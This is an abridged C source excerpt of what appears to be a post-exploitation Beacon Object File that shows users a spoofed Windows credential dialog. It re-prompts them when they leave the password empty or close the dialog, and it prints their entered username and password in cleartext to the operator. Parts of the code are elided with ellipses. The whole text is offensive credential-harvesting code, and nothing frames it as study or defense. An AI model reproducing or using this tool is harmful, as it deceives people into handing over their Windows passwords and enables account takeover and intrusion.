...
BOOL PromptForCreds(LPWSTR title, LPWSTR message, LPWSTR *username, LPWSTR *password, LPWSTR *domain, UINT timeout, BOF_Buffer* buffer)
{
    ...
    do
    {
        ...
        result = CREDUI$CredUIPromptForWindowsCredentialsW(
            ...
            &auth_package,
            packed_credentials,
            packed_credentials_size,
            &out_credentials,
            &out_credentials_size,
            &save_credentials,
        ...
        if (result == NO_ERROR)
        {
            ...
            *domain = (LPWSTR)MSVCRT$malloc(CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR));
            ...
            if (!bValidPassword)
            {
                ...
                BofPrintf(buffer, "[!] User tried to enter empty password\n");
            }
		...
		else
        {
			if (KERNEL32$WaitForSingleObject(hTimeoutEvent, 0) == WAIT_OBJECT_0)
            {
                ...
                BofPrintf(buffer, "[!] Credential prompt timed out\n");
				break;
            ...
            else
            {
                ...
                BofPrintf(buffer, "[!] User tried to close the prompt\n");
			}
		}
...
int go(char *args, int len)
{
	...
	result = PromptForCreds(title, message, &username, &password, &domain, timer_seconds, &buffer);

cleanup:
    if (result)
	{
        // internal_printf("[+] Entered credentials by user:\n\tUsername: %ls\n\tPassword: %ls\n", username, password);
        BofPrintf(&buffer, "[+] Entered credentials by user:\n\tUsername: %ls\n\tPassword: %ls\n", username, password);
		// printoutput(TRUE);
